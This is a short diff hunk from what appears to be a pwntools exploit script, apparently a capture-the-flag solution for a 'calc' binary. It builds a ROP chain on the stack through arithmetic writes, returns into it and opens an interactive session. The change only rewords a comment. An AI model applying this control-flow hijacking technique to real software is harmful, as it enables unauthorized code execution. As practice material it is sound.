@@ -59,5 +59,5 @@ for i in range(len(ropchain)):  # Build the ropchain.
 		set_stack(361+i, stack_val - ropchain[i], "-")	
 	else:
 		set_stack(361+i, ropchain[i] - stack_val, "+")
-p.sendline("\n")  # send a newline to return from calc()
+p.sendline("\n")  # Send a newline to return from calc() and into the ropchain
 p.interactive()
